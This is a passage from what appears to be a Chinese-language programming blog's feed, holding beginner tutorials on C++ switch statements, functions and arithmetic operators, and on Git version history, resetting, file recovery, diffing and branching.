<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(表达式)</span><br><span class="line">    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">1</span>:执行语句;<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">2</span>:执行语句;<span class="keyword">break</span>;  </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:执行语句;<span class="keyword">break</span>;    </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;prefect&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//此处一定不要忘记break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;normal&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;bad&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>switch缺点：判断时只能是整型或者字符型，不可以是区间，而if可以</p>
<p>switch有点：结构清晰，执行效率高</p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++的函数</title>
    <url>/2022/01/17/C-%E7%9A%84%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>将一串经常会使用的代码封装起来，减少重复代码。一个较大的程序，一般分为若干个程序块，每个模块实现特定的功能。</p>
<h1 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h1><p>函数的定义一般分为5个步骤：</p>
<ul>
<li><p>返回值类型</p>
</li>
<li><p>函数名</p>
</li>
<li><p>参数表列</p>
</li>
<li><p>函数体语句</p>
</li>
<li><p>return表达式</p>
<span id="more"></span>

<p>语法：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名  (参数列表)</span><br><span class="line">&#123;</span><br><span class="line">	函数体语句</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span>表达式</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>例如</p>
<p>实现一个加法函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s=a+b;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="函数的调用"><a href="#函数的调用" class="headerlink" title="函数的调用"></a>函数的调用</h1><p>语法：<code>函数名(参数)</code></p>
<p>例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s=a+b;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">	<span class="keyword">int</span> c=<span class="built_in">add</span>(m,n); <span class="comment">//此处m和n均为整型,叫实际参数，简称实参</span></span><br><span class="line">	cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：定义时a，b并没有真实数据，只是一个形式，叫做形参。当调用函数时，实参的值会传给形参</strong></p>
<h1 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h1><p>定义：值传递就是函数调用时实参将数值传给形参</p>
<p>形参发生变化，不会影响实参</p>
<p>示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ex</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;交换前第一个数&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;交换前第二个数&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">int</span> t=a;</span><br><span class="line">        a=b;</span><br><span class="line">        b=t;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;交换后第一个数&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;交换后第二个数&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//return s;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">	<span class="built_in">ex</span>(m,n);</span><br><span class="line">	cout&lt;&lt;m&lt;&lt;n&lt;&lt;endl;<span class="comment">//实参不变，也就是m还是第一个输入的数,变化的是形参</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="函数常见样式"><a href="#函数常见样式" class="headerlink" title="函数常见样式"></a>函数常见样式</h1><ul>
<li><p>无参无返</p>
</li>
<li><p>有参有返</p>
</li>
<li><p>无参有返</p>
</li>
<li><p>有参有返</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//无参无返</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;无参无返&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参无返</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;有参无返 a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无参有返</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;无参有返&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">555</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参有返</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test4</span><span class="params">(<span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;有参有返 t=&quot;</span>&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">test1</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">100</span>;</span><br><span class="line">    <span class="built_in">test2</span>(n);<span class="comment">//传参100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c=<span class="built_in">test3</span>();</span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    d=<span class="built_in">test4</span>(<span class="number">100</span>);<span class="comment">//100传给t 返回666</span></span><br><span class="line">    cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h1><p>作用：告诉编译器函数名称及如何调用函数。函数的实际本体可以单独定义。</p>
<ul>
<li>函数的<strong>声明可以多次</strong>，但是函数的<strong>定义只能有一次</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">m</span>(a,b)&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>若不声明，定义只能在main函数之前，如上。</p>
<p>定义后</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;<span class="comment">//声明(可以有多次，如此,一般就写一次.定义不能这样)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">m</span>(a,b)&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="函数的分文件编写"><a href="#函数的分文件编写" class="headerlink" title="函数的分文件编写"></a>函数的分文件编写</h1><p>作用：让代码块结构更加清晰</p>
<p>函数分文件编写一般有4个步骤</p>
<ol>
<li>创建后缀名为**.h**的头文件</li>
<li>创建后缀名为**.cpp**的源文件</li>
<li>在头文件中写函数声明</li>
<li>在源文件中写函数定义</li>
</ol>
<p>示例</p>
<p>头文件 max.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;<span class="comment">//声明</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>源文件max.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">m</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><span class="comment">//定义</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;max.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>,b=<span class="number">20</span>;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">m</span>(a,b)&lt;&lt;endl; <span class="comment">//直接引用</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Git版本穿梭及版本比较</title>
    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
<li><p>状态查看：<code>git status</code></p>
</li>
<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
</li>
<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
<span id="more"></span></li>
</ul>
<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
<p>简洁显示：<code>git log --pretty=oneline</code></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
<p>HEAD@{移动到当前版本所需要步数}</p>
<p>若版本信息有多屏</p>
<p>则空格向下翻页，b向上翻页，q退出</p>
<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
<p>现在状态为</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
<p>然后删除文件，并添加到暂存区</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
<p>上图表示第一行删去了9个a</p>
<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git的分支管理级Git的基本原理</title>
    <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
<li><p>分支是主干（master）的复制品，可以进行试错，可以删除，也也可以合并回主干</p>
</li>
<li><p>分支更加专业化，分支之间互不干扰</p>
</li>
<li><p>可以多人同时开发不同分支，增加开发效率</p>
<span id="more"></span></li>
</ul>
<h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><p>查看所有分支命令：<code>git branch -v</code></p>
<p>创建新的分支：<code>git branch 分支名</code></p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195627374.png" alt="image-20220110195627374"></p>
<p>分支的切换：<code>git checkout 分支名</code></p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195754653.png" alt="image-20220110195754653"></p>
<p>用hot_fix分支修改文件</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200141530.png" alt="image-20220110200141530"></p>
<p>若要将hot_fix分支合并到master分支上，则要切换到master分支上（即被合并的分支）</p>
<p>合并命令：<code>git merge 分支名</code></p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200612093.png" alt="image-20220110200612093"></p>
<p>当分支有冲突时（即两个分支都对同一地方进行了修改）</p>
<p>首先要产生冲突</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110201910358.png" alt="image-20220110201910358"></p>
<p>产生冲突后看产生冲突的文件内容</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202059391.png" alt="image-20220110202059391"></p>
<p>删除多于内容后（可在阅览模式下双击d键删除一行）</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202632027.png" alt="image-20220110202632027"></p>
<p>保留自己想要的内容，然后<code>git add 文件名</code>，<code>git commit -m &quot;备注&quot;</code>提交</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110203321229.png" alt="image-20220110203321229"></p>
<h1 id="Git基本原理"><a href="#Git基本原理" class="headerlink" title="Git基本原理"></a>Git基本原理</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希是一个系列的加密算法，各个不同的哈希加密虽然加密强度不同，但是有以下几个共同点</p>
<ul>
<li>不管输入的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定。</li>
<li>哈希加密确定，输入数据有变化，输出数据一定有变化，而且变化程度很大。</li>
<li>哈希算法确定，输入数据确定，输出数据能够保证不变。</li>
<li>哈希算法不可逆</li>
</ul>
<p>Git底层采用的是SHA-1算法。</p>
<p>哈希算法可以被用来验证文件。原理如下</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111095840028.png" alt="image-20220111095840028"></p>
<p>Git就是靠这种操作从根本上保证数据的完整性。</p>
<h2 id="Git保存版本机制"><a href="#Git保存版本机制" class="headerlink" title="Git保存版本机制"></a>Git保存版本机制</h2><p>首先讲一下集中式版本控制工具的文件管理机制</p>
<p>以文件变更列表的方式存储信息。这类系统将它们保存的信息看作时一组基本文件和每个文件随时间逐步积累的差异。也就是只保存更改的地方</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111101222004.png" alt="image-20220111101222004"></p>
<p>然后是Git的文件管理机制</p>
<p>Git把数据看作是小型文件系统的一组快照，每次提交更新时，Git都会对当前的全部文件制作一个快照并保存这个快照的索引。为了高效，<u>如果文件没有修改，Git不再重新存储该文件</u>。所以Git的工作方式可以称之为快照流。</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103051918.png" alt="image-20220111103051918"></p>
<p>Git的提交对象</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103632587.png" alt="image-20220111103632587"></p>
<p>提交对象及其父对象形成的链条</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103823481.png" alt="image-20220111103823481"></p>
<h2 id="Git分支管理机制"><a href="#Git分支管理机制" class="headerlink" title="Git分支管理机制"></a>Git分支管理机制</h2><p>分支的创建</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111104023440.png" alt="image-20220111104023440"></p>
<p>testing指针和master指针在同一链条，而不是为testing单搞一条链，节省了储存空间</p>
<p>分支切换（改变HEAD指针的位置）</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111121831087.png" alt="image-20220111121831087"></p>
<p>当分支文件不一样时，才会出现分支</p>
<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
<p><strong>Git在本地的版本控制就完结了</strong></p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>C++运算符</title>
    <url>/2021/12/10/C-%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    <content><![CDATA[<h1 id="1-运算符类型"><a href="#1-运算符类型" class="headerlink" title="1.运算符类型"></a>1.运算符类型</h1><p>运算运算符：用于四则运算</p>
<p>赋值运算符：用于表达式的值赋给变量</p>
<p>比较运算符：用于表达式的比较，并返回一个真值或假值</p>
<p>逻辑运算符：用于根据表达式的值返回真值或假值</p>
<span id="more"></span>

<h1 id="2-算术运算符"><a href="#2-算术运算符" class="headerlink" title="2.算术运算符"></a>2.算术运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>正号</td>
<td>+3</td>
<td>3</td>
</tr>
<tr>
<td>-</td>
<td>负号</td>
<td>-3</td>
<td>-3</td>
</tr>
<tr>
<td>+</td>
<td>加</td>
<td>1+1</td>
<td>2</td>
</tr>
<tr>
<td>-</td>
<td>减</td>
<td>1-1</td>
<td>0</td>
</tr>
<tr>
<td>*</td>
<td>乘</td>
<td>2*3</td>
<td>6</td>
</tr>
<tr>
<td>/</td>
<td>除</td>
<td>6*3</td>
<td>2</td>
</tr>
<tr>
<td>%</td>
<td>取模（取余）</td>
<td>5%3</td>
<td>2</td>
</tr>
<tr>
<td>++</td>
<td>前置递增</td>
<td>a=2;b=++a;</td>
<td>a=3;b=3;</td>
</tr>
<tr>
<td>++</td>
<td>后置递增</td>
<td>a=2;b=a++;</td>
<td>a=3;b=2;</td>
</tr>
<tr>
<td>–</td>
<td>前置递减</td>
<td>a=2;b=–a;</td>
<td>a=1;b=1;</td>
</tr>
<tr>
<td>–</td>
<td>后置递减</td>
<td>a=2;b=a–;</td>
<td>a=1;b=2;</td>
</tr>
</tbody></table>
<p>四则运算如下</p>
